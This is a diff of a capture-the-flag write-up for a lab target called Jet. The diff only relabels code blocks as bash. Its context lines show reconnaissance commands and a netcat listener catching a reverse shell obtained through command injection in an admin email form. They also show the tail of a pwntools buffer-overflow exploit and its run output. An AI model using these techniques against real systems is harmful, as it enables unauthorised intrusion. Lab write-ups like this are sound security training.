@@ -1,5 +1,5 @@
 # Nmap
-```
+```bash
 Nmap scan report for 10.13.37.10
 Host is up, received user-set (0.18s latency).
 Scanned at 2024-02-07 12:27:48 +08 for 1513s
@@ -43,7 +43,7 @@ http://10.13.37.10<br>
 ![Flag 1](https://github.com/ngohuiann/CTF-Write-Ups/blob/main/image/Fortress%20Jet%20F1.png)
 
 # Flag 2 Digging In
-```
+```bash
 dig @10.13.37.10 -x 10.13.37.10 
 
 ; <<>> DiG 9.19.19-1-Debian <<>> @10.13.37.10 -x 10.13.37.10
@@ -82,7 +82,7 @@ Error message when attempting to sign in with admin:admin shows that admin user 
 # Flag 5 Command
 Trigger a post request to http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/email.php through the admin dashboard "Quick email" form. Start a netcat listener and receive a reverse shell through command injection.
 ![Flag 5](https://github.com/ngohuiann/CTF-Write-Ups/blob/main/image/Fortress%20Jet%20F5.png)
-```
+```bash
 rlwrap nc -lnvp 1234
 listening on [any] 1234 ...
 connect to [10.10.14.2] from (UNKNOWN) [10.13.37.10] 54576
@@ -141,7 +141,7 @@ p.sendline (payload)
 
 p.interactive()
 ```
-```
+```bash
 www-data@jet:/tmp$ python bof.py
 python bof.py
 [x] Opening connection to 10.13.37.10 on port 60006
